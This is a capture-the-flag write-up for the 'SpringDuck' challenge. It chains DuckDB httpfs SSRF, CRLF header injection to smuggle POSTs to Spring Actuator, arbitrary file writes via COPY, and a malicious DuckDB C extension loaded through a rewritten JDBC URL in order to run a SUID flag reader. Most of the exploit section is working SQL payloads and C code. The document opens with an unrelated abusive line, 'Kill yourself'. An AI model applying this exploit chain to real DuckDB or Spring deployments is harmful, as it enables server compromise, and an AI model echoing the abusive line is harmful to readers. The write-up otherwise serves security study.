

# Kill yourself

# SpringDuck CTF Solve (DuckDB + Spring Actuator)

  ## TL;DR
  Use DuckDB `httpfs` SSRF + CRLF header injection to POST to actuator, change JDBC URL to load a malicious DuckDB extension on restart, then call `readflag()`.

  Flag: `0ops{quack5_qu4cks_gu4cks}`

  ---

  ## 1) Recon + Constraints

  - Endpoint: `POST /duck` accepts JSON `{"sql":"..."}` and runs `JdbcTemplate.queryForRowSet`.
  - Controller **forces**:

  SET allow_community_extensions=false;
  SET allow_unsigned_extensions=false;

  - DuckDB v1.4.1 with `httpfs` extension loaded.
  - `/flag` is root-only, `/readflag` is SUID and prints the flag.
  - Spring Actuator runs internally at `127.0.0.1:8081` with `env` POST and `restart` enabled.

  ---

  ## 2) SSRF via DuckDB httpfs

  DuckDB can read HTTP URLs:

  ```sql
  SELECT * FROM read_text('http://127.0.0.1:8081/actuator');
  ```
  This reaches the internal actuator.

  ———

  ## 3) POST to Actuator via CRLF Injection

  DuckDB httpfs uses cpp-httplib. Its header writer doesn’t sanitize CRLF in header values.
  We can smuggle a second HTTP request by injecting \r\n.

  Use a secret:
```sql
  CREATE SECRET s (
    TYPE http,
    EXTRA_HTTP_HEADERS MAP {
      'zzzz': 'x\r\nContent-Length: 0\r\n\r\nPOST /actuator/env HTTP/1.1\r\nHost: 127.0.0.1:8081\r\nContent-Type: application/json\r\nContent-Length:
  <LEN>\r\n\r\n{"name":"...","value":"..."}'
    }
  );
  SELECT content FROM read_text('http://127.0.0.1:8081/actuator');
  DROP SECRET s;
```
  Notes:

  - zzzz ensures the header is inserted last (sorted multimap).
  - Content-Length should include the extra \r\n\r\n appended by httplib, so LEN = len(payload)+4.

  We use this to POST /actuator/env and /actuator/restart.

  ———

  ## 4) Write Files via DuckDB COPY (FORMAT BLOB)

  Even though queryForRowSet expects a result set, DuckDB executes the COPY if we append a SELECT:

  COPY (SELECT from_hex('<HEX>')::BLOB) TO '/tmp/file' (FORMAT BLOB);
  SELECT 1;

  This allows arbitrary file writes in /tmp.

  ———

  ## 5) Malicious DuckDB Extension (readflag())

  We build a C API extension that registers readflag() and runs /readflag:
```c
  #define DUCKDB_EXTENSION_NAME readflag
  #include "duckdb_extension.h"
  #include <cstdio>
  #include <string>

  DUCKDB_EXTENSION_EXTERN

  static std::string ReadFlagOutput() {
      FILE *fp = popen("/readflag", "r");
      if (!fp) return "popen_failed";
      std::string out;
      char buf[256];
      while (fgets(buf, sizeof(buf), fp)) out += buf;
      pclose(fp);
      while (!out.empty() && (out.back() == '\n' || out.back() == '\r')) out.pop_back();
      return out;
  }

  static void ReadFlagFunction(duckdb_function_info info, duckdb_data_chunk input, duckdb_vector output) {
      const auto count = duckdb_data_chunk_get_size(input);
      const auto out = ReadFlagOutput();
      for (idx_t i = 0; i < count; i++) {
          duckdb_vector_assign_string_element_len(output, i, out.c_str(), out.size());
      }
  }

  static void RegisterReadFlagFunction(duckdb_connection connection) {
      auto function = duckdb_create_scalar_function();
      duckdb_scalar_function_set_name(function, "readflag");
      auto type = duckdb_create_logical_type(DUCKDB_TYPE_VARCHAR);
      duckdb_scalar_function_set_return_type(function, type);
      duckdb_destroy_logical_type(&type);
      duckdb_scalar_function_set_function(function, ReadFlagFunction);
      duckdb_register_scalar_function(connection, function);
      duckdb_destroy_scalar_function(&function);
  }

  DUCKDB_EXTENSION_ENTRYPOINT(duckdb_connection connection, duckdb_extension_info info, duckdb_extension_access *access) {
      RegisterReadFlagFunction(connection);
      return true;
  }
```
  ### Critical Fixes

  - ABI must be C_STRUCT, not CPP, so DuckDB loads readflag_init_c_api.
  - Footer order matters: metadata first 256 bytes, signature last 256 bytes.
  - Use C API version v1.2.0, platform linux_amd64.

  ———

  ## 6) Load Extension at Startup via JDBC URL

  We can’t LOAD directly due to forced unsigned restrictions.
  So we change the JDBC URL via actuator:

  1. Write the extension:
```sql
  COPY (SELECT from_hex('<READFLAG_HEX>')::BLOB)
  TO '/tmp/readflag.duckdb_extension' (FORMAT BLOB);
  SELECT 1;

  2. Write init SQL:

  COPY (SELECT from_hex('4c4f414420272f746d702f72656164666c61672e6475636b64625f657874656e73696f6e273b')::BLOB)
  TO '/tmp/init.sql' (FORMAT BLOB);
  SELECT 1;

  3. Smuggle POST /actuator/env:

  {
    "name": "spring.datasource.url",
    "value": "jdbc:duckdb:;session_init_sql_file=/tmp/init.sql;allow_unsigned_extensions=true;allow_community_extensions=true"
  }
  ```

  4. Smuggle POST /actuator/restart.

  On restart, the JDBC connection is recreated and the extension loads.

  ———

  ## 7) Get the Flag

  SELECT readflag() AS flag;

  Result:

  0ops{quack5_qu4cks_gu4cks}



